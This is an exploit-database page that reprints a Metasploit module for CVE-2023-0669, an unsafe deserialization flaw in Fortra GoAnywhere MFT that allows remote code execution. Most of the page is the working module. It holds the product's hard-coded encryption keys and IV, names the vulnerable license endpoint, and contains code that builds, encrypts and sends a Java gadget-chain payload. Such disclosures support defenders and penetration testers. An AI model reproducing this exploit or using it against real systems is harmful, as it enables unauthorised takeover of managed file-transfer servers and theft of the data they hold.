---
title: Fortra GoAnywhere MFT Unsafe Deserialization Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023020020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-10
fetch_date: 2025-10-04T06:12:17.088681
---

# Fortra GoAnywhere MFT Unsafe Deserialization Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fortra GoAnywhere MFT Unsafe Deserialization Remote Code Execution** **2023.02.09**  Credit:  **[Ron Bowes](https://cxsecurity.com/author/Ron%2BBowes/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-0669](https://cxsecurity.com/cveshow/CVE-2023-0669/ "Click to see CVE-2023-0669")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::JavaDeserialization
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Fortra GoAnywhere MFT Unsafe Deserialization RCE',
'Description' => %q{
This module exploits CVE-2023-0669, which is an object deserialization
vulnerability in Fortra GoAnywhere MFT.
},
'Author' => [
'Ron Bowes', # Analysis and module
],
'References' => [
['CVE', '2023-0669'],
['URL', 'https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis'],
],
'DisclosureDate' => '2023-02-01',
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'win'],
'Arch' => [ARCH\_CMD],
'Privileged' => false,
'Targets' => [
[
'Version 2 Encryption',
{
'DefaultOptions' => {
'Version' => '$2',
'EncryptionKey' => '0e69a3839b6ecf45649b861f4a27171b66870c9567a4144ebaf3d52fdc4064ca',
'EncryptionIv' => '4145532f4342432f504b435335506164'
}
},
],
[
'Version 1 Encryption',
{
'DefaultOptions' => {
'Version' => '',
'EncryptionKey' => '678b5830bf8b8a2e0474b97d6cd18e845fbc4b11fca0d6af2db1eb114c29fc4b',
'EncryptionIv' => '4145532f4342432f504b435335506164'
}
}
],
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 8001,
'SSL' => true
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'Unsafe deserialization endpoint', '/goanywhere/lic/accept']),
])
register\_advanced\_options([
OptString.new('Version', [false, 'A version value to append to the encrypted data']),
OptString.new('EncryptionKey', [true, 'The encryption key to use (hex-encoded)'], regex: /^([a-fA-F0-9]{2})+$/),
OptString.new('EncryptionIv', [true, 'The initialization vector (hex-encoded)'], regex: /^([a-fA-F0-9]{2})+$/),
OptString.new('EncryptionAlgorithm', [true, 'The encryption algorithm', 'AES-256-CBC'])
])
end
def build\_cipher
unless OpenSSL::Cipher.ciphers.any? { |cipher\_name| cipher\_name.casecmp?(datastore['EncryptionAlgorithm']) }
raise Msf::OptionValidateError.new({ 'EncryptionAlgorithm' => 'The selected encryption algorithm is not supported by OpenSSL.' })
end
cipher = OpenSSL::Cipher.new(datastore['EncryptionAlgorithm'])
cipher.encrypt
option\_errors = {}
iv = datastore['EncryptionIv'].scan(/../).map { |x| x.hex.chr }.join
unless cipher.iv\_len == iv.length
option\_errors['EncryptionIv'] = "The encryption IV is not the correct length (is: #{iv.length}, should be: #{cipher.iv\_len})."
end
key = datastore['EncryptionKey'].scan(/../).map { |x| x.hex.chr }.join
unless cipher.key\_len == key.length
option\_errors['EncryptionKey'] = "The encryption key is not the correct length (is: #{key.length}, should be: #{cipher.key\_len})."
end
raise Msf::OptionValidateError, option\_errors unless option\_errors.empty?
cipher.iv = iv
cipher.key = key
cipher
end
def exploit
vprint\_status('Generating a serialized Java object with the payload')
obj = generate\_java\_deserialization\_for\_payload('CommonsBeanutils1', payload)
vprint\_status('Encrypting the payload')
cipher = build\_cipher
obj = cipher.update(obj) + cipher.final
vprint\_status('Sending request to the server')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => datastore['TARGETURI'],
'vars\_post' => {
'bundle' => "#{Base64.urlsafe\_encode64(obj)}#{datastore['Version'] || ''}"
}
)
fail\_with(Failure::Unreachable, 'No response received from the target.') unless res
if res.code != 500
fail\_with(Failure::UnexpectedReply, "Expected the server to return HTTP/500, instead received HTTP/#{res.code}")
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020020)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top